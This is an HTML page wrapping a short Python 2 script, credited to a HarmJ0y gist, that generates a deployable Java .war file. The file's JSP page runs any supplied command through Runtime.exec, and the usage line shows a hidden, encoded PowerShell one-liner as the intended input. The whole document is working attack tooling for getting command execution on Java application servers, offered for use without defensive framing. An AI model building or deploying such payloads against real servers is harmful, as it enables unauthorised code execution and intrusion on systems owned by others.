<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Powershell to War</title>
</head><body>#!/usr/bin/python<br/>
# https://gist.github.com/HarmJ0y/aecabdc30f4c4ef1fad3<br/>
# Code that quickly generates a deployable .war for a PowerShell one-liner<br/>
<br/>
import zipfile<br/>
import StringIO<br/>
import sys<br/>
<br/>
def generatePsWar(psCmd, appName):<br/>
<br/>
  # .war manifest<br/>
  manifest = &quot;Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n&quot;<br/>
<br/>
  # Create initial JSP and Web XML Strings with placeholders<br/>
  jspCode = '''&lt;%@ page import=&quot;java.io.*&quot; %&gt;<br/>
&lt;% <br/>
Process p=Runtime.getRuntime().exec(&quot;'''+str(psCmd)+'''&quot;);<br/>
%&gt;<br/>
'''<br/>
<br/>
  # .xml deployment config<br/>
  wxmlCode = '''&lt;?xml version=&quot;1.0&quot;?&gt;<br/>
&lt;!DOCTYPE web-app PUBLIC <br/>
&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; <br/>
&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;<br/>
&lt;web-app&gt;<br/>
&lt;servlet&gt;<br/>
&lt;servlet-name&gt;%s&lt;/servlet-name&gt;<br/>
&lt;jsp-file&gt;/%s.jsp&lt;/jsp-file&gt;<br/>
&lt;/servlet&gt;<br/>
&lt;/web-app&gt;<br/>
''' %(appName, appName)<br/>
<br/>
  # build the in-memory ZIP and write the three files in<br/>
  warFile = StringIO.StringIO() <br/>
  zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)<br/>
<br/>
  zipData.writestr(&quot;META-INF/MANIFEST.MF&quot;, manifest)<br/>
  zipData.writestr(&quot;WEB-INF/web.xml&quot;, wxmlCode)<br/>
  zipData.writestr(appName + &quot;.jsp&quot;, jspCode)<br/>
  zipData.close()<br/>
<br/>
  return warFile.getvalue()<br/>
<br/>
<br/>
if len(sys.argv) != 2:<br/>
	print &quot;\nUsage: ./pswar.py 'powershell -w hidden -nop -enc BLAH'\n&quot;<br/>
<br/>
<br/>
else:<br/>
<br/>
	war = generatePsWar(sys.argv[1], 'launcher')<br/>
<br/>
	f = open(&quot;launcher.war&quot;, 'wb')<br/>
	f.write(war)<br/>
	f.close()<br/>
<br/>
	print &quot;\nLauncher WAR written to launcher.war\n&quot;</body></html>